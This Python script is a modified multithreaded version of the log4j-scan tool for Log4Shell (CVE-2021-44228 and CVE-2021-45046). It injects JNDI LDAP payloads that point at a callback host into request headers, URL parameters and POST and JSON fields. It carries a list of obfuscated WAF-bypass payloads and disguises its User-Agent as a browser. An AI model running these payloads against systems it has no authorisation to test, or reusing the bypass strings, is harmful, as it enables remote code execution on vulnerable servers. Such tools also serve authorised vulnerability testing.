#!/usr/bin/env python3
# coding=utf-8
# ******************************************************************
# log4j-scan: A generic scanner for Apache log4j RCE CVE-2021-44228
# Author:
# Mazin Ahmed <Mazin at FullHunt.io>
# Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.
# Secure your Attack Surface with FullHunt.io.
# ******************************************************************

import argparse
import random
import threading
from queue import Queue
import requests
import sys
from urllib import parse as urlparse
from termcolor import cprint


# Disable SSL warnings
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass


cprint('[•] CVE-2021-44228 - Apache Log4j RCE Scanner', "green")
cprint('Modify by https://github.com/fullhunt/log4j-scan/commit/ceae24f4ebdbbdfc1dc350bab4d512d9dcf8027c')
cprint('[•] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.', "yellow")
cprint('[•] Secure your External Attack Surface with FullHunt.io.', "yellow")

if len(sys.argv) <= 1:
    print('\n%s -h for help.' % (sys.argv[0]))
    exit(0)


default_headers = {
    #'User-Agent': 'log4j-scan (https://github.com/mazen160/log4j-scan)',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
    'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
}

post_data_parameters = ["username", "user", "uname", "name", "email", "email_address", "password"]
timeout = 4

waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
                       "${jnd${123%25ff:-${123%25ff:-i:}}ldap://{{callback_host}}/{{random}}}",
                       "${j${k8s:k5:-ND}i:ldap://{{callback_host}}/{{random}}}",
                       "${j${k8s:k5:-ND}i:ldap${sd:k5:-:}//{{callback_host}}/{{random}}}",
                       "${j${k8s:k5:-ND}i${sd:k5:-:}ldap://{{callback_host}}/{{random}}}",
                       "${j${k8s:k5:-ND}i${sd:k5:-:}ldap${sd:k5:-:}//{{callback_host}}/{{random}}}",
                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap://{{callback_host}}/{{random}}}",
                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap{sd:k5:-:}//{{callback_host}}/{{random}}}",
                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}ap${sd:k5:-:}//{{callback_host}}/{{random}}}",
                       "${j${k8s:k5:-ND}i${sd:k5:-:}${lower:L}dap${sd:k5:-:}//{{callback_host}}/{{random}}",
                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}a${::-p}${sd:k5:-:}//{{callback_host}}/{{random}}}",
                       "${jndi:${lower:l}${lower:d}a${lower:p}://{{callback_host}}/{{random}}}",
                       "${jnd${upper:i}:ldap://{{callback_host}}/{{random}}}",
                       "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://{{callback_host}}/{{random}}}"
                       ]

cve_2021_45046 = [
                  "${jndi:ldap://127.0.0.1#{{callback_host}}/{{random}}}",  # Source: https://twitter.com/marcioalm/status/1471740771581652995,
                  "${jndi:ldap://127.0.0.1#{{callback_host}}/{{random}}}",
                  "${jndi:ldap://127.1.1.1#{{callback_host}}/{{random}}}"
                 ]

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url",
                    dest="url",
                    help="Check a single URL.",
                    action='store')
parser.add_argument("-p", "--proxy",
                    dest="proxy",
                    help="send requests through proxy",
                    action='store')
parser.add_argument("-l", "--list",
                    dest="usedlist",
                    help="Check a list of URLs.",
                    action='store')
parser.add_argument("--request-type",
                    dest="request_type",
                    help="Request Type: (get, post) - [Default: get].",
                    default="get",
                    action='store')
parser.add_argument("--headers-file",
                    dest="headers_file",
                    help="Headers fuzzing list - [default: headers.txt].",
                    default="headers.txt",
                    action='store')
parser.add_argument("--run-all-tests",
                    dest="run_all_tests",
                    help="Run all available tests on each URL.",
                    action='store_true')
parser.add_argument("--exclude-user-agent-fuzzing",
                    dest="exclude_user_agent_fuzzing",
                    help="Exclude User-Agent header from fuzzing - useful to bypass weak checks on User-Agents.",
                    action='store_true')
parser.add_argument("--waf-bypass",
                    dest="waf_bypass_payloads",
                    help="Extend scans with WAF bypass payloads.",
                    action='store_true')
parser.add_argument("--custom-waf-bypass-payload",
                    dest="custom_waf_bypass_payload",
                    help="Test with custom WAF bypass payload.")
parser.add_argument("--test-CVE-2021-45046",
                    dest="cve_2021_45046",
                    help="Test using payloads for CVE-2021-45046 (detection payloads).",
                    action='store_true')
parser.add_argument("--custom-dns-callback-host",
                    dest="custom_dns_callback_host",
                    help="Custom DNS Callback Host.",
                    action='store')
parser.add_argument("--disable-http-redirects",
                    dest="disable_redirects",
                    help="Disable HTTP redirects. Note: HTTP redirects are useful as it allows the payloads to have a higher chance of reaching vulnerable systems.",
                    action='store_true')

args = parser.parse_args()


proxies = {}
if args.proxy:
    proxies = {"http": args.proxy, "https": args.proxy}


if args.custom_waf_bypass_payload:
    waf_bypass_payloads.append(args.custom_waf_bypass_payload)

def get_fuzzing_headers(payload):
    fuzzing_headers = {}
    fuzzing_headers.update(default_headers)
    with open(args.headers_file, "r") as f:
        for i in f.readlines():
            i = i.strip()
            if i == "" or i.startswith("#"):
                continue
            fuzzing_headers.update({i: payload})
    if args.exclude_user_agent_fuzzing:
        fuzzing_headers["User-Agent"] = default_headers["User-Agent"]

    if "Referer" in fuzzing_headers:
        fuzzing_headers["Referer"] = f'https://{fuzzing_headers["Referer"]}'
    return fuzzing_headers


def get_fuzzing_post_data(payload):
    fuzzing_post_data = {}
    for i in post_data_parameters:
        fuzzing_post_data.update({i: payload})
    return fuzzing_post_data


def generate_waf_bypass_payloads(callback_host, random_string):
    payloads = []
    for i in waf_bypass_payloads:
        new_payload = i.replace("{{callback_host}}", callback_host)
        new_payload = new_payload.replace("{{random}}", random_string)
        payloads.append(new_payload)
    return payloads


def get_cve_2021_45046_payloads(callback_host, random_string):
    payloads = []
    for i in cve_2021_45046:
        new_payload = i.replace("{{callback_host}}", callback_host)
        new_payload = new_payload.replace("{{random}}", random_string)
        payloads.append(new_payload)
    return payloads

def parse_url(url):
    """
    Parses the URL.
    """

    # Url: https://example.com/login.jsp
    url = url.replace('#', '%23')
    url = url.replace(' ', '%20')

    if ('://' not in url):
        url = str("http://") + str(url)
    scheme = urlparse.urlparse(url).scheme

    # FilePath: /login.jsp
    file_path = urlparse.urlparse(url).path
    if (file_path == ''):
        file_path = '/'

    return({"scheme": scheme,
            "site": f"{scheme}://{urlparse.urlparse(url).netloc}",
            "host":  urlparse.urlparse(url).netloc.split(":")[0],
            "file_path": file_path})


def scan_url():
    global q
    callback_host = args.custom_dns_callback_host
    while q.empty() is not True:
        url = q.get()
        parsed_url = parse_url(url)
        random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
        payload = '${jndi:ldap://%s/%s/%s}' % (callback_host, parsed_url["host"],random_string)
        payloads = [payload]
        if args.waf_bypass_payloads:
            payloads.extend(generate_waf_bypass_payloads(f'{callback_host}/{parsed_url["host"]}', random_string))

        if args.cve_2021_45046:
            cprint(f"[•] Scanning for CVE-2021-45046 (Log4j v2.15.0 Patch Bypass - RCE)", "yellow")
            payloads = get_cve_2021_45046_payloads(f'{callback_host}/{parsed_url["host"]}', random_string)

        for payload in payloads:
            cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")

            if args.request_type.upper() == "GET" or args.run_all_tests:
                try:
                    requests.request(url=url,
                                     method="GET",
                                     params={"v": payload},
                                     headers=get_fuzzing_headers(payload),
                                     verify=False,
                                     timeout=timeout,
                                     allow_redirects=(not args.disable_redirects),
                                     proxies=proxies)
                except Exception as e:
                    cprint(f"EXCEPTION: {e}")

            if args.request_type.upper() == "POST" or args.run_all_tests:
                try:
                    # Post body
                    requests.request(url=url,
                                     method="POST",
                                     params={"v": payload},
                                     headers=get_fuzzing_headers(payload),
                                     data=get_fuzzing_post_data(payload),
                                     verify=False,
                                     timeout=timeout,
                                     allow_redirects=(not args.disable_redirects),
                                     proxies=proxies)
                except Exception as e:
                    cprint(f"EXCEPTION: {e}")

                try:
                    # JSON body
                    requests.request(url=url,
                                     method="POST",
                                     params={"v": payload},
                                     headers=get_fuzzing_headers(payload),
                                     json=get_fuzzing_post_data(payload),
                                     verify=False,
                                     timeout=timeout,
                                     allow_redirects=(not args.disable_redirects),
                                     proxies=proxies)
                except Exception as e:
                    cprint(f"EXCEPTION: {e}")
        q.task_done()

def main():
    urls = []
    if args.url:
        urls.append(args.url)
    if args.usedlist:
        with open(args.usedlist, "r") as f:
            for i in f.readlines():
                i = i.strip()
                if i == "" or i.startswith("#"):
                    continue
                urls.append(i)

    dns_callback_host = ""
    if args.custom_dns_callback_host:
        cprint(f"[•] Using custom DNS Callback host [{args.custom_dns_callback_host}]. No verification will be done after sending fuzz requests.")
        dns_callback_host = args.custom_dns_callback_host

    cprint("[%] Checking for Log4j RCE CVE-2021-44228.", "magenta")
    global q
    q = Queue()
    for i in urls:
        q.put(i)
    for index in range(20):
        thread = threading.Thread(target=scan_url, args=())
        # thread.daemon = True  # 随主线程退出而退出
        thread.start()
    q.join()

    # for url in urls:
    #     cprint(f"[•] URL: {url}", "magenta")
    #     scan_url(url, dns_callback_host)

    if args.custom_dns_callback_host:
        cprint("[•] Payloads sent to all URLs. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability. Exiting.", "cyan")
        return

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nKeyboardInterrupt Detected.")
        print("Exiting...")
        exit(0)
